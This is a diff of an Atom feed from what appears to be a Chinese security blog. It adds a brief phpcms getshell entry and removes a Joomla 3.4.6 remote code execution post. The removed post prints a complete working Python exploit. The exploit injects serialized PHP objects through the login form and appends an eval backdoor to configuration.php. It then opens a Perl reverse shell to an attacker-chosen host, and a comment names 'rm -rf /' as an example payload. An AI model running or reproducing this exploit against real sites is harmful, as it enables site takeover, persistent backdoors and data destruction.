@@ -2,14 +2,26 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-12-27T08:39:55.131Z</updated>
+    <updated>2019-12-31T16:51:04.964Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
     <subtitle>不在平静中灭亡~  </subtitle>
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
-    <rights>All rights reserved 2019, 斯文beast</rights>
+    <rights>All rights reserved 2020, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[跨年诶，phpcms后台getshell]]></title>
+        <id>http://www.svenbeast.com//post/XzA6X7QIp</id>
+        <link href="http://www.svenbeast.com//post/XzA6X7QIp">
+        </link>
+        <updated>2019-12-31T16:46:10.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li>细节在tools里，我就是过年不知道发啥，大晚上那就复现一下吧。。吧。（抢到个云悉邀请码，开森）<br>
+<img src="http://www.svenbeast.com//post-images/1577810790913.png" alt=""></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[kali转发公网+过360+配合msf入侵windows7]]></title>
         <id>http://www.svenbeast.com//post/RD6ZQ1MX_</id>
@@ -507,209 +519,6 @@ public class Exploit{
 <li>3.jdk版本需要注意，下方图片jdk版本不存在此漏洞</li>
 </ul>
 <figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1571663940441.png" alt=""></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Joomla 3.4.6-RCE漏洞利用]]></title>
-        <id>http://www.svenbeast.com//post/WH877Va6k</id>
-        <link href="http://www.svenbeast.com//post/WH877Va6k">
-        </link>
-        <updated>2019-10-10T07:10:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
-<ul>
-<li>Joomla是一套支持多种语言，全球都有名的CMS系统。其实日常也见不到😗</li>
-<li>这次披露的是Joomla 3.4.6版本，最新版本目前是3.9.12</li>
-</ul>
-<h3 id="0x02-搭建环境">0x02 搭建环境</h3>
-<ul>
-<li>下载地址：https://github.com/joomla/joomla-cms/releases/download/3.4.6/Joomla_3.4.6-Stable-Full_Package.zip</li>
-<li>让我们来使用phpstudy_pro来搭建环境吧🙃，这次不会再有后门了吧<br>
-<img src="http://www.svenbeast.com//post-images/1570692151502.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570692253263.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570692290692.png" alt=""></li>
-</ul>
-<h3 id="0x03-getshell">0x03 getshell</h3>
-<ul>
-<li>已经有成型exp了，让我们直接上手吧，成功getshell</li>
-<li>它会在configuration.php文件中写入一句话，密码为vchvnalfdvnrrogormraprcrclduahcmjsyclppxegutxrjhog<br>
-<img src="http://www.svenbeast.com//post-images/1570692440276.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570693086231.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570693192611.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570693126424.png" alt=""></li>
-</ul>
-<h3 id="0x04-exp">0x04 exp</h3>
-<ul>
-<li>一位师傅已经写好的，我搬过来的</li>
-<li>usage:python3 rce.py -t http://127.0.0.1 -e</li>
-</ul>
-<pre><code>
-#!/usr/bin/env python3
-  
-import requests
-from bs4 import BeautifulSoup
-import sys
-import string
-import random
-import argparse
-from termcolor import colored
-  
-PROXS = {'http':'127.0.0.1/Joomla_3.4.6'}
-PROXS = {}
-  
-def random_string(stringLength):
-        letters = string.ascii_lowercase
-        return ''.join(random.choice(letters) for i in range(stringLength))
-  
-  
-backdoor_param = random_string(50)
-  
-def print_info(str):
-        print(colored(&quot;[*] &quot; + str,&quot;cyan&quot;))
-  
-def print_ok(str):
-        print(colored(&quot;[+] &quot;+ str,&quot;green&quot;))
-  
-def print_error(str):
-        print(colored(&quot;[-] &quot;+ str,&quot;red&quot;))
-  
-def print_warning(str):
-        print(colored(&quot;[!!] &quot; + str,&quot;yellow&quot;))
-  
-def get_token(url, cook):
-        token = ''
-        resp = requests.get(url, cookies=cook, proxies = PROXS)
-        html = BeautifulSoup(resp.text,'html.parser')
-        # csrf token is the last input
-        for v in html.find_all('input'):
-                csrf = v
-        csrf = csrf.get('name')
-        return csrf
-  
-  
-def get_error(url, cook):
-        resp = requests.get(url, cookies = cook, proxies = PROXS)
-        if 'Failed to decode session object' in resp.text:
-                #print(resp.text)
-                return False
-        #print(resp.text)
-        return True
-  
-  
-def get_cook(url):
-        resp = requests.get(url, proxies=PROXS)
-        #print(resp.cookies)
-        return resp.cookies
-  
-  
-def gen_pay(function, command):
-        # Generate the payload for call_user_func('FUNCTION','COMMAND')
-        template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}'
-        #payload =  command + ' || $a=\'http://wtf\';'
-        payload =  'http://l4m3rz.l337/;' + command
-        # Following payload will append an eval() at the enabled of the configuration file
-        #payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
-        function_len = len(function)
-        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
-        return final
-  
-def make_req(url , object_payload):
-        # just make a req with object
-        print_info('Getting Session Cookie ..')
-        cook = get_cook(url)
-        print_info('Getting CSRF Token ..')
-        csrf = get_token( url, cook)
-  
-        user_payload = '\\0\\0\\0' * 9
-        padding = 'AAA' # It will land at this padding
-        working_test_obj = 's:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}'
-        clean_object = 'A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB' # working good without bad effects
-  
-        inj_object = '&quot;;'
-        inj_object += object_payload
-        inj_object += 's:6:&quot;return&quot;;s:102:' # end the object with the 'return' part
-        password_payload = padding + inj_object
-        params = {
-            'username': user_payload,
-            'password': password_payload,
-            'option':'com_users',
-            'task':'user.login',
-            csrf :'1'
-            }
-  
-        print_info('Sending request ..')
-        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
-        return resp.text
-  
-def get_backdoor_pay():
-        # This payload will backdoor the the configuration .PHP with an eval on POST request
-  
-        function = 'assert'
-        template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}'
-        # payload =  command + ' || $a=\'http://wtf\';'
-        # Following payload will append an eval() at the enabled of the configuration file
-        payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
-        function_len = len(function)
-        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
-        return final
-  
-def check(url):
-        check_string = random_string(20)
-        target_url = url + 'index.php/component/users'
-        html = make_req(url, gen_pay('print_r',check_string))
-        if check_string in html:
-                return True
-        else:
-                return False
-  
-def ping_backdoor(url,param_name):
-        res = requests.post(url + '/configuration.php', data={param_name:'echo \'PWNED\';'}, proxies = PROXS)
-        if 'PWNED' in res.text:
-                return True
-        return False
-  
-def execute_backdoor(url, payload_code):
-        # Execute PHP code from the backdoor
-        res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)
-        print(res.text)
-  
-def exploit(url, lhost, lport):
-        # Exploit the target
-        # Default exploitation will append en eval function at the end of the configuration.pphp
-        # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')
-        # e.g. get_payload('system','rm -rf /')
-  
-        # First check that the backdoor has not been already implanted
-        target_url = url + 'index.php/component/users'
-  
-        make_req(target_url, get_backdoor_pay())
-        if ping_backdoor(url, backdoor_param):
-                print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)
-                print_info('Now it\'s time to reverse, trying with a system + perl')
-                execute_backdoor(url, 'system(\'perl -e \\\'use Socket;$i=&quot;'+ lhost +'&quot;;$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\\\'\');')
-  
-  
-if __name__ == '__main__':
-        parser = argparse.ArgumentParser()
-        parser.add_argument('-t','--target',required=True,help='Joomla Target')
-        parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')
-        parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')
-        parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')
-        parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')
-        args = vars(parser.parse_args())
-  
-        url = args['target']
-        if(check(url)):
-                print_ok('Vulnerable')
-                if args['exploit']:
-                        exploit(url, args['lhost'], args['lport'])
-                else:
-                        print_info('Use --exploit to exploit it')
-  
-        else:
-                print_error('Seems NOT Vulnerable ;/')
-
-
-</code></pre>
 ]]></content>
     </entry>
 </feed>
